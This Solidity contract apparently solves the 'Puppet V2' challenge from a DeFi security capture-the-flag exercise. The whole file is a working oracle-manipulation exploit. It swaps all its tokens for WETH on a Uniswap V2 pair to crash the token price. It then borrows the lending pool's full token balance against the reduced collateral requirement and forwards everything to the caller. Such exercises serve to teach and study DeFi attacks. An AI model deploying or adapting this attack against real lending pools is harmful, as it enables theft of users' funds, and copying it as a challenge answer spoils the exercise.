// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import '@uniswap/v2-periphery/contracts/interfaces/IWETH.sol';
import "hardhat/console.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint amount) external returns (bool);
}

interface IPuppetV2Pool {
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
    function borrow(uint256 borrowAmount) external;
}
contract PuppetV2PoolAttacker {
    IPuppetV2Pool pool;
    IUniswapV2Router02 router;
    IERC20 token;
    IWETH weth;
    constructor(IPuppetV2Pool _pool, IUniswapV2Router02 _router, IERC20 _token, IWETH _weth) public {
        pool    = _pool;
        router  = _router;
        token   = _token;
        weth    = _weth;
    }
    //all token and weth should be transferred to this contract firstly
    function attack() external payable {
        weth.deposit{value: msg.value}();
        uint amountIn = token.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uint deadline = block.timestamp+60;
        token.approve(address(router), token.balanceOf(address(this)));
        router.swapExactTokensForTokens(amountIn, 1, path, address(this), deadline);
        uint borrowAmount = token.balanceOf(address(pool));
        uint depositOfWETHRequired = pool.calculateDepositOfWETHRequired(borrowAmount);
        require(depositOfWETHRequired<=IERC20(address(weth)).balanceOf(address(this)), "WETH not enough");
        IERC20(address(weth)).approve(address(pool), IERC20(address(weth)).balanceOf(address(this)));
        pool.borrow(borrowAmount);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
    
    receive() external payable {}
}